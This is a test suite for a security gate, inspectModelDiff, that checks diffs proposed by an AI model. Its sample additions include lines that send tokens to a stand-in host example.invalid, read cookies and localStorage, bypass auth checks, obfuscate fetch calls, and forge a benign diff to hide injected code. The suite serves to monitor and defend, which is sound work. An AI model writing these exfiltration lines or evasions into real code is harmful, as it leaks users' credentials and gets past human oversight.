import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { MODEL_ALLOWED_PATH } from '../aieo/lib/model-provider.mjs';
import { inspectModelDiff } from './aieo-model-security.mjs';

const hash = (value) => createHash('sha256').update(value).digest('hex');
const original = 'const items = 1;\n';
const actual = 'const items = 2;\n';
const report = { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) };
const diff = '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n';
const input = { original, actual, changedPaths: [MODEL_ALLOWED_PATH], diff, report };

test('independent security accepts one exact clean change', () => {
  assert.equal(inspectModelDiff(input).status, 'passed');
});
test('security blocks changed-file scope and hash tampering', () => {
  assert.equal(inspectModelDiff({ ...input, changedPaths: ['supabase/config.toml'] }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, changedPaths: [MODEL_ALLOWED_PATH, 'package.json'] }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, report: { ...report, proposedHash: 'wrong' } }).status, 'failed');
});
test('security blocks suspicious newly introduced calls and credentials', () => {
  assert.equal(inspectModelDiff({ ...input, diff: '+fetch("https://example.invalid")' }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, diff: '+ghp_' + 'a'.repeat(30) }).status, 'failed');
});
test('security blocks no-op and massive diffs', () => {
  assert.equal(inspectModelDiff({ ...input, actual: original }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, diff: '+safe\n'.repeat(25) }).status, 'failed');
});

test('security rejects browser exfiltration primitives and modern credentials', () => {
  for (const addition of [
    '+const raw = document.cookie;',
    '+localStorage.getItem("token");',
    '+new WebSocket("wss://example.invalid");',
    '+<div dangerouslySetInnerHTML={{ __html: message }} />;',
    '+import { execSync } from "child_process";',
    '+sk-or-v1-' + 'a'.repeat(40),
    '+github_pat_' + 'b'.repeat(40),
    '+Bearer ' + 'c'.repeat(36)
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security rejects browser side-channel exfiltration and navigation additions', () => {
  for (const addition of [
    '+window.open("https://example.invalid/?data=" + token);',
    '+navigator["sendBeacon"]("https://example.invalid", body);',
    '+const pixel = new Image();',
    '+location.assign("https://example.invalid");',
    '+window.location.href = "https://example.invalid";',
    '+document.createElement("iframe");',
    '+globalThis["fetch"]("https://example.invalid");'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security rejects newly added outbound markup and CSS, including multiline JSX', () => {
  for (const addition of [
    '+<img src={unsafeUrl} />',
    '+<a href={unsafeUrl}>Open</a>',
    '+<form action={unsafeUrl}>Send</form>',
    '+<iframe\n+ src={unsafeUrl} />',
    '+const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security refuses removal of existing feedback authentication and ownership guards', () => {
  const protectedSource = [
    'const auth = await supabase.auth.getUser();',
    'if (!auth.user) return;',
    'const record = { created_by: auth.user.id };',
    'await supabase.from("feedback").insert(record);',
    ''
  ].join('\n');
  const variants = [
    protectedSource.replace('if (!auth.user)', 'if (true)'),
    protectedSource.replace('created_by: auth.user.id', 'created_by: null'),
    protectedSource.replace('await supabase.auth.getUser()', 'Promise.resolve(null)')
  ];
  for (const current of variants) {
    const evidence = {
      status: 'proposed', sourceHash: hash(protectedSource), proposedHash: hash(current)
    };
    const result = inspectModelDiff({
      original: protectedSource, actual: current, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n+const safe = 1;\n', report: evidence
    });
    assert.equal(result.status, 'failed');
    assert.ok(result.findings.some((value) => value.includes('authentication or ownership')));
  }
});

test('security freezes submit handler against comment-only auth bypass while allowing UI text edits', () => {
  const base = [
    'export default function FeedbackWidget() {',
    '  async function submit(event: FormEvent<HTMLFormElement>) {',
    '    const { data: auth } = await supabase.auth.getUser();',
    '    if (!auth.user) { return; }',
    '    await supabase.from("feedback").insert({ created_by: auth.user.id });',
    '  }',
    '  return <>',
    '    <form onSubmit={submit}><span>Old label</span></form>',
    '  </>;',
    '}',
    ''
  ].join(String.fromCharCode(10));
  const assess = (actual, diff) => inspectModelDiff({
    original: base, actual, changedPaths: [MODEL_ALLOWED_PATH], diff,
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(actual) }
  });
  const safe = base.replace('Old label', 'New label');
  assert.equal(assess(safe, '+    <form onSubmit={submit}><span>New label</span></form>').status, 'passed');
  // The old substring-only guard accepted commented-out auth checks.
  const commented = base.replace('    if (!auth.user)', '    // if (!auth.user)');
  const commentResult = assess(commented, '+    // if (!auth.user) { return; }');
  assert.equal(commentResult.status, 'failed');
  assert.ok(commentResult.findings.some((finding) => finding.includes('submit handler')));
  const reassigned = base.replace('<form onSubmit={submit}>', '<form onSubmit={() => {}}>');
  assert.equal(assess(reassigned, '+    <form onSubmit={() => {}}><span>Old label</span></form>').status, 'failed');
  const blockComment = base.replace('    if (!auth.user)', '    /* if (!auth.user)');
  assert.equal(assess(blockComment, '+    /* if (!auth.user) { return; }').status, 'failed');
});


test('independent Security rejects optional chaining and indirect browser API additions', () => {
  for (const addition of [
    "fetch?.(\"https://example.invalid/?key=\" + token);",
    "navigator?.sendBeacon?.(\"https://example.invalid\", token);",
    "window?.[\"open\"]?.(\"https://example.invalid\");",
    "globalThis[\"fe\" + \"tch\"](\"https://example.invalid\");",
    "const send = navigator.sendBeacon.bind(navigator);",
    "const forward = fetch; forward(\"https://example.invalid\");",
    "const transport = new WebTransport(\"https://example.invalid\");",
    "const stream = new EventSource(\"https://example.invalid\");",
    "const access = location?.assign;",
    "self[\"fetch\"](\"https://example.invalid\");",
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: '+ ' + addition }).status, 'failed', addition);
  }
});

test('independent Security rejects new HTML navigation, form, SVG and media transfer attributes', () => {
  for (const addition of [
    '+<iframe srcDoc={untrustedMarkup} />',
    '+<button formAction="https://example.invalid/collect">Send</button>',
    '+<input type="image" src="https://example.invalid/pixel" />',
    '+<a ping="https://example.invalid/track">Open</a>',
    '+<svg><image href="https://example.invalid/pixel" /></svg>',
    '+<svg><use xlink:href="https://example.invalid/asset" /></svg>',
    '+<video poster="https://example.invalid/pixel" />',
    '+<meta httpEquiv="refresh" content="0;url=https://example.invalid/" />',
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('independent Security rejects CSS imports and image-set URLs without fetch calls', () => {
  for (const addition of [
    '+const css = `@import "https://example.invalid/style.css";`;',
    '+const css = `background: image-set("https://example.invalid/pixel" 1x);`;',
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('independent Security rejects long padded JSX sinks and opaque spreads', () => {
  for (const addition of [
    '+<img ' + ' '.repeat(360) + 'src={unsafeUrl} />',
    '+<a ' + ' '.repeat(360) + 'href={unsafeUrl}>Open</a>',
    '+<img {...{ src: unsafeUrl }} />',
    '+<a {...untrustedProps}>Open</a>'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition.slice(0, 50));
  }
  assert.equal(inspectModelDiff(input).status, 'passed');
});

test('independent Security detects URL sinks beyond quoted angles, arrow functions and nested JSX', () => {
  for (const addition of [
    '+<img alt="one > two" src={unsafeUrl} />',
    "+<a title='left > right' href={unsafeUrl}>Open</a>",
    '+<img onLoad={() => 1 > 0} src={unsafeUrl} />',
    '+<div content={<img src={unsafeUrl} />} />',
    '+<Widget title="one > two" {...unsafeProps} />'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
  const safeActual = '<span title="one > two">Safe label</span>;\n';
  assert.equal(inspectModelDiff({
    ...input, actual: safeActual,
    diff: '@@ -1 +1 @@\n-const items = 1;\n+<span title="one > two">Safe label</span>;\n',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safeActual) }
  }).status, 'passed');
});

test('independent Security checks assembled JSX when added diff line omits opening tag', () => {
  const original = 'const view = <img\\n  alt="safe"\\n/>;\\n'.replaceAll('\\n', '\n');
  const fragment = '  alt="safe"';
  const inspect = (replace) => {
    const actual = original.replace(fragment, replace);
    return inspectModelDiff({
      original, actual, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -2 +2 @@\n-' + fragment + '\n+' + replace + '\n',
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) }
    });
  };
  assert.equal(inspect('  alt="safe" src={token}').status, 'failed');
  assert.equal(inspect('  alt="safe" {...forwardedProps}').status, 'failed');
  assert.equal(inspect('  alt="updated safe"').status, 'passed');
});


test('independent Security rejects URL-bearing props on custom JSX components', () => {
  for (const addition of [
    '+<RemoteImage src={privateUrl} />',
    '+<RouterLink href={privateUrl}>Follow</RouterLink>',
    '+<Widget xlink:href={privateUrl} />',
    '+<Card title="safe" srcSet={privateUrl} />'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
  const original = 'const node = <RemoteImage alt="safe image" />;\n';
  const actual = original.replace('alt="safe image"', 'alt="safe image" src={privateUrl}');
  const changed = inspectModelDiff({ original, actual, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-alt="safe image"\n+alt="safe image" src={privateUrl}\n',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) } });
  assert.equal(changed.status, 'failed');
  const benign = '<Display label="safe" />';
  const benignActual = benign + '\n';
  assert.equal(inspectModelDiff({
    ...input, actual: benignActual,
    diff: '@@ -1 +1 @@\n-const items = 1;\n+' + benign + '\n',
    report: { status: 'proposed', sourceHash: hash(input.original), proposedHash: hash(benignActual) }
  }).status, 'passed');
});


test('independent Security prevents new SDK-backed data access while preserving existing client use', () => {
  const base = 'const client = supabase;\\nconst label = "old";\\n'.replaceAll('\\n', '\n');
  const approved = base.replace('"old"', '"new"');
  const clean = inspectModelDiff({
    original: base, actual: approved, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -2 +2 @@\n-const label = "old";\n+const label = "new";\n',
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(approved) }
  });
  assert.equal(clean.status, 'passed', 'unchanged pre-existing SDK references are not banned');
  for (const addition of [
    'const leak = supabase.from("profiles").select("*");',
    'const session = supabase.auth.getSession();',
    'const { from } = supabase;'
  ]) {
    const next = base + addition + '\n';
    const checked = inspectModelDiff({
      original: base, actual: next, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -2,0 +3 @@\n+' + addition + '\n',
      report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(next) }
    });
    assert.equal(checked.status, 'failed', addition);
    assert.ok(checked.findings.includes('Potentially unsafe new code'));
  }
});

test('Security independently binds reported added lines to actual source, including duplicate insertions', () => {
  const base = 'const status = "ok";\n';
  const assess = (next, reported) => inspectModelDiff({
    original: base, actual: next, changedPaths: [MODEL_ALLOWED_PATH], diff: reported,
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(next) }
  });
  const harmless = 'const status = "ready";\n';
  assert.equal(assess(harmless, '@@ -1 +1 @@\n-const status = "ok";\n+const status = "ready";\n').status, 'passed');
  const forged = assess(harmless, '@@ -1 +1 @@\n-const status = "ok";\n+const status = "masked";\n');
  assert.equal(forged.status, 'failed');
  assert.ok(forged.findings.includes('Reported diff omits newly introduced source lines'));

  const injected = base + 'fetch("https://example.invalid/collect?token=" + token);\n';
  const omitted = assess(injected, '@@ -1 +1 @@\n-const status = "ok";\n+const status = "ok";\n');
  assert.equal(omitted.status, 'failed', 'a falsified benign diff cannot conceal source-side transport');
  assert.ok(omitted.findings.includes('Reported diff omits newly introduced source lines'));
  assert.ok(omitted.findings.includes('Potentially unsafe new code'));

  const duplicated = base + 'const status = "ok";\n';
  const noDuplicate = assess(duplicated, '@@ -1 +1 @@\n-const status = "ok";\n+const status = "ok";\n');
  assert.equal(noDuplicate.status, 'passed', 'a correctly reported duplicate is permitted');
  assert.ok(noDuplicate.findings.includes('Reported diff omits newly introduced source lines') === false, 'one reported duplicate is covered');
  const missingDuplicate = assess(duplicated, '@@ -1 +0,0 @@\n');
  assert.equal(missingDuplicate.status, 'failed');
  assert.ok(missingDuplicate.findings.includes('Reported diff omits newly introduced source lines'));
});
